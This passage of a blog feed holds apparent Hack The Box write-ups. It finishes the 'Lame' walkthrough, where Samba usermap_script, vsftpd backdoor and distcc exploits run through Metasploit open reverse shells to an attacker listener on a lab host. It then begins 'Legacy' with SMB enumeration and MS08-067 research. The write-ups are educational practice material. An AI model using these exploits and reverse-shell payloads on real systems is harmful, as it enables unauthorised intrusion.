&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitSearch1.png&quot; alt=&quot;MetasploitSearch1&quot; /&gt;&lt;br /&gt;
Oh geez. There is quite a few here. Let’s go about this differently. A quick Google search found &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script&quot;&gt;this little fella.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitModuleSite.png&quot; alt=&quot;Site Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The site says that it works on Samba 3.0.20 which is perfect. The site also gives us the CVE on this. &lt;strong&gt;CVE-2007-2447&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can google the CVE to get some more information about it to know what we are dealing with.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447&quot;&gt;CVE info from Mitre&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2007-2447&quot;&gt;CVE info from Nist.gov&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.exploit-db.com/exploits/16320&quot;&gt;CVE Exploit on EDB&lt;/a&gt;&lt;br /&gt;
That last link is the same script we were looking at from the Searchsploit. It’s starting to look like this might be our best bet. Let’s take a look at it from Metasploit.&lt;/p&gt;

&lt;h2 id=&quot;smb-exploit&quot;&gt;SMB Exploit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitModule.png&quot; alt=&quot;Finding it in Metasploit&quot; /&gt;
Doing a quick search finds this module.&lt;/p&gt;

&lt;p&gt;Let’s go ahead and use it and see what the options are.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/samba/usermap_script
 msf5 exploit(multi/samba/usermap_script) &amp;gt; options
 
 Module options (exploit/multi/samba/usermap_script):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
 RPORT   139              yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(multi/samba/usermap_script) &amp;gt; set rhost 10.10.10.3
 rhost =&amp;gt; 10.10.10.3
 msf5 exploit(multi/samba/usermap_script) &amp;gt; run
 
 [*] Started reverse TCP double handler on 10.10.14.17:4444 
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo uoDexrJBt0bwYHdC;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: &quot;uoDexrJBt0bwYHdC\r\n&quot;
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
 
 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Holy Gaucammmoooellee. That was quick and easy. We didn’t even have to enumerate the other ports.&lt;/p&gt;

&lt;h2 id=&quot;shell&quot;&gt;Shell&lt;/h2&gt;
&lt;p&gt;So now we have some sort of shell. It’s not perfect and it’s kind of wonky. But we can test it out real quick.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/Exploit.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is prettty ugly. But you can tell that I was able to ls, and pwd. Also move into the root folder and find the root.txt and cat it out. So. Technically this box is rooted. Maybe we should check for other users real quick.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/passwd.png&quot; alt=&quot;passwd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay so looking through this, you can see your typical passwd list and there is one that stands out called Makis. Let’s see if we can get to Makis home folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/movingaround.png&quot; alt=&quot;movingaround&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sweet. We were able to find both the root and the user flags. This is realllly done. But.. before we wrap up, there was quite a bit of other vulnerabilities and CVEs right? I’m curious to see what we can do with those heckin cuties.&lt;/p&gt;

&lt;h1 id=&quot;other-vulns&quot;&gt;Other Vulns&lt;/h1&gt;

&lt;p&gt;Let’s check the FTP stuff first. Search for it in Metasploit real quick and you’ll find something worth poking at.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show targets
 
 Exploit targets:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; options
 
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
 RPORT   21               yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set rhosts 10.10.10.3
 rhosts =&amp;gt; 10.10.10.3
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; run
 
 [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 10.10.10.3:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It doesn’t do much but let you know you need a password. So let’s hit the books on this one.&lt;/p&gt;
&lt;h2 id=&quot;manual-exploit&quot;&gt;Manual exploit&lt;/h2&gt;

&lt;p&gt;After doing some Googlefu I found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200&lt;/p&gt;

&lt;p&gt;Manual exploit references.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/&quot;&gt;Exploit vsftpd version 2.3.4&lt;/a&gt;  &lt;br /&gt;
&lt;a href=&quot;https://charlesreid1.com/wiki/Metasploitable/VSFTP&quot;&gt;Another reference writeup&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/ftpExploit.png&quot; alt=&quot;FTP Exploit&quot; /&gt;    &lt;br /&gt;
Weird. Okay. So it opens a new port. From reading about this exploit, the 6200 port should allow us to telnet to it and get a shell. I wasn’t successful at getting a shell this way.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/telnet6200.png&quot; alt=&quot;telnet6200&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pretty interesting either way. Still a vulnerability even if I couldn’t manage to get it working!&lt;/p&gt;

&lt;h2 id=&quot;distcc-metasploit-exploit&quot;&gt;DistCC Metasploit exploit&lt;/h2&gt;

&lt;p&gt;Next on our list is this curious DistCC port that is open. We saw from our scan that there is a CVE on it. &lt;strong&gt;CVE:CVE-2004-2687&lt;/strong&gt;. Let’s try finding something with our highly technical Googling powers and then on Metasploit. &lt;br /&gt;
&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2004-2687&quot;&gt;Nist.gov CVE information&lt;/a&gt; &lt;br /&gt;
&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687&quot;&gt;Mitre.org CVE information&lt;/a&gt;  &lt;br /&gt;
&lt;a href=&quot;https://www.exploit-db.com/exploits/9915&quot;&gt;Exploit DB - The Metasploit module&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Seems like this protocol is used to compile things over the network, and has a flaw that allows us to spit some things at it that gives us a shell.&lt;/p&gt;

&lt;p&gt;The meat of the exploit is simple. Here is a snippet.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dist_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;# Convince distccd that this is a compile&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;%w{# -c main.c -o main.o}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;# Set distcc 'magic fairy dust' and argument count&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DIST00000001&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ARGC%.8x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;# Set the command arguments&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ARGV%.8x%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically just asking it to compile a shell. Okay okay. summplee.&lt;/p&gt;

&lt;p&gt;Let’s try just poking at it using the Metasploit module.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/distcc.png&quot; alt=&quot;distccExploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had to set a payload for this. Setting the options were easy.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/misc/distcc_exec
msf5 exploit(unix/misc/distcc_exec) &amp;gt; options

Module options (exploit/unix/misc/distcc_exec):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
RPORT   3632             yes       The target port (TCP)

Exploit target:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) &amp;gt; set rhosts 10.10.10.3
rhosts =&amp;gt; 10.10.10.3
msf5 exploit(unix/misc/distcc_exec) &amp;gt; show targets

Exploit targets:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) &amp;gt; set payload cmd/unix/reverse
payload =&amp;gt; cmd/unix/reverse

msf5 exploit(unix/misc/distcc_exec) &amp;gt; run

[*] Started reverse TCP double handler on 10.10.14.17:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo m93VaQ0EKR7SGV6V;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: &quot;m93VaQ0EKR7SGV6V\r\n&quot;
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400

whoami
daemon
pwd
/tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay well. That’s all I have for this box right now. I might come back and dig into some of this later and add things. Hope this helped and all that jazz.&lt;/p&gt;

&lt;p&gt;Cheers, 
Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out Legacy first. Feel free to use my writeup for that one as well.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If this writeup isn’t enough, HTB does include &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/2&quot;&gt;a writeup&lt;/a&gt; on the site. There are also plenty of videos online how to do this box as well.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Okay let’s get into it&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;scanning-the-machine&quot;&gt;Scanning the machine&lt;/h3&gt;
&lt;p&gt;So from HTB we already know the IP address is &lt;code&gt;10.10.10.4&lt;/code&gt; so as long as our OpenVPN connection is setup we should be able to start banging on it.&lt;/p&gt;

&lt;p&gt;I’m going to scan this in a few different ways. First let’s do a basic nmap.&lt;/p&gt;

&lt;h4 id=&quot;basic-nmap&quot;&gt;Basic nmap&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.10.10.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;or in case it has trouble&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -Pn 10.10.10.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/basic_nmap.png&quot; alt=&quot;Basic nmap scan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This scan will give us some basic information. It’s good to do this scan first to see if there are any ports you can start to enumearte while waiting for larger scans.&lt;br /&gt;
From this we can guess it might have something to do with SMB. How?&lt;br /&gt;
&lt;strong&gt;SMB&lt;/strong&gt;&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Has older SMB port 139. SMB used to run on 139 on top of netbios&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Has newer SMB port 445. After Windows 2000, SMB was moved to this port.&lt;br /&gt;
It’s not enough for full confidence but it’s enough to start to see where we might be going with this.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s run a couple bigger scans.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The next two scans can be run back to back but if you run the nmapAutomator.sh script, it includes the nmap scan I’m about to show you.&lt;/p&gt;

&lt;h4 id=&quot;big-nmap-scan&quot;&gt;“Big nmap” scan&lt;/h4&gt;
&lt;p&gt;I personally call this the big nmap. It’s a scan that will scan all ports, and run anything it can against it.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -T4 -A -p- 10.10.10.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I kept &lt;code&gt;-Pn&lt;/code&gt; just because.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/big_nmap.png&quot; alt=&quot;big nmap &quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before we run the next scan, lets go ahead and see what we can find from this.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Still looks like SMB&lt;/li&gt;
  &lt;li&gt;SMB Security looks weak - &lt;code&gt;message_signing: disabled&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Evidence that it is an older Windows machine, most likely XP.&lt;/li&gt;
  &lt;li&gt;Computer name is ‘Legacy’&lt;/li&gt;
  &lt;li&gt;Workgroup is ‘HTB’&lt;/li&gt;
  &lt;li&gt;Maybe possible to enumerate Netbios&lt;/li&gt;
  &lt;li&gt;Has directory services enabled&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Okay let’s run the nmapAutomator.sh scan.&lt;/p&gt;

&lt;h4 id=&quot;nmapautomatorsh&quot;&gt;nmapAutomator.sh&lt;/h4&gt;
&lt;p&gt;Before we run this scan, let’s talk about it a bit.&lt;br /&gt;
nmapAutomator.sh is a bash script written by Github users &lt;strong&gt;21y4d, austinsonger, and Knowledge_Wisdom_Understanding&lt;/strong&gt; and can be found on &lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;Github here.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It will run a handful of scans at the same time for you including:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;sslscan&lt;/li&gt;
  &lt;li&gt;nikto&lt;/li&gt;
  &lt;li&gt;wpscan&lt;/li&gt;
  &lt;li&gt;smbmap&lt;/li&gt;
  &lt;li&gt;etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So let’s run a full scan and see how it goes.&lt;br /&gt;
The scan is quite lengthy so I won’t be posting a screenshot of the whole thing, but if you want to see the whole scan, you can watch it here. &lt;a href=&quot;https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This scan basically just confirmed what we found from previous scans. But it did give some particularly interesting information on the SMB situation.
&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/nmapauto_vulns.png&quot; alt=&quot;SMB Vulnerabilities&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we know that this machine has two CVEs marked as vulnerable.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2008-4250&lt;/li&gt;
  &lt;li&gt;CVE-2017-0143&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this point we could probably start poking at these CVEs but let’s try to dig in a bit further before attacking the machine.&lt;/p&gt;

&lt;h4 id=&quot;netbios-enumeration&quot;&gt;Netbios enumeration&lt;/h4&gt;
&lt;p&gt;So with netbios there are a couple ways we can enumerate it. The first way is to run &lt;code&gt;nbtscan&lt;/code&gt; on it to see what services we can see. We are looking for information about it being connected to a domain or a some sort of file server service.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtscan -vh 10.10.10.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After running this we see that it in fact has a file server service running as well as a few others listed. This is good information for us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/nbtscan.png&quot; alt=&quot;Nbtscan&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;smb-enumeration&quot;&gt;SMB enumeration&lt;/h4&gt;
&lt;p&gt;Okay so when we ran our big nmap scan we got plenty of information on SMB but let’s just run some SMB specific enumerations real fast just for the heck of it. Let’s start with smbclient.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\\\10.10.10.4\\\
smbclient -N -L \\\10.10.10.4\\

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;smbclient is a small application similar to FTP. It may allow you to view files from the server. It also allows to put files on the server, view files, etc. In some cases you will be able to log in anonymously.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclient.png&quot; alt=&quot;smbclient&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Alright so. When I wrote this post I didn’t realize what this error was coming from. After doing some research I realized that my .conf file that handles smb client was configured to run a newer version of SMB. So, if you run into this, I have a quick writeup on how to fix it &lt;a href=&quot;/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclientupdated.png&quot; alt=&quot;SMBclientUpdated&quot; /&gt;&lt;/p&gt;

  &lt;p&gt;After changing the conf file. This is what it looked like. To be expected. Invalid parameter means it doesn’t like a blank password.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;smbmap is also a great tool for enumerating SMB, in paticular when working with Active Directory or domains.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another way to enumerate SMB is to use nmap with the SMB script. We have already done this in the big nmap scan we did previously, but if you wanted to run it again it would look like this.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p 445 --script smb-os-discovery 10.10.10.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, you should know that Metasploit has amazing auxiliary scanners. You can use Metasploit to search keywords and then go from there. You’ll find an auxiliary module called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_version&lt;/code&gt; that is useful here. The steps here are basic.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use&lt;/code&gt; and the module name.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt; to view what needs to be set&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt; each option as needed.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt; to run the module.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) &amp;gt; options

Module options (auxiliary/scanner/smb/smb_version):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
SMBDomain  .                no        The Windows domain to use for authentication
SMBPass                     no        The password for the specified username
SMBUser                     no        The username to authenticate as
THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) &amp;gt; set RHOSTS
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf5 auxiliary(scanner/smb/smb_version) &amp;gt; set RHOSTS 10.10.10.4
RHOSTS =&amp;gt; 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) &amp;gt; run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sweet so this specifically tells us a few things.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Windows XP SP3&lt;/li&gt;
  &lt;li&gt;Host name is LEGACY&lt;/li&gt;
  &lt;li&gt;Workgroup is called HTB&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This is pretty good information to have.&lt;/p&gt;
&lt;h3 id=&quot;digging-into-the-cves&quot;&gt;Digging into the CVEs&lt;/h3&gt;

&lt;p&gt;So there are two CVEs that we noticed earlier. There are loads of ways to search these to find out more information about the machine. I always suggest doing a few different searches to find out basic information and also confirm what you’ve read. If you’re just looking at one post, you’re probably missing out on a lot of information. Below is a bit of research I did on both CVEs. I’ve included the links I felt were important as well.&lt;/p&gt;

&lt;p&gt;Before we hit Google, lets try a little &lt;strong&gt;Searchsploit&lt;/strong&gt;… starting with &lt;strong&gt;CVE-2008-4250&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2008-4250&quot;&gt;CVE-2008-4250&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Searchsploit&lt;/strong&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/SearchSploit-MS08-067.png&quot; alt=&quot;MS08-067 SearchSploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Notice that when I searched for it by CVE I got nothing. That’s why searching in different places is so important. I knew to also search MS08-067 because of this next page…&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CVEDetails.com&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2008-4250/&quot;&gt;CVE Details link&lt;/a&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/CVE-Details-2008-4250.png&quot; alt=&quot;CVE Screenshot&quot; /&gt; &lt;br /&gt;
The CVE Details page always gives loads of information. Here is the take away.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Allows for Remote Code Execution - &lt;em&gt;Exactly what we want to hear when trying to gain initial access&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Has Metasploit Module ;)&lt;/li&gt;
  &lt;li&gt;Works on older Windows Servers between 2000-2008&lt;/li&gt;
  &lt;li&gt;Highest level of risk - CVSS Score of 10&lt;/li&gt;
  &lt;li&gt;Authentication not required for exploit&lt;/li&gt;
  &lt;li&gt;Complexity is low&lt;/li&gt;
  &lt;li&gt;Access gained - Admin&lt;/li&gt;
  &lt;li&gt;Also known as MS08-067 (This is useful for doing further research)&lt;/li&gt;
&lt;/ul&gt;

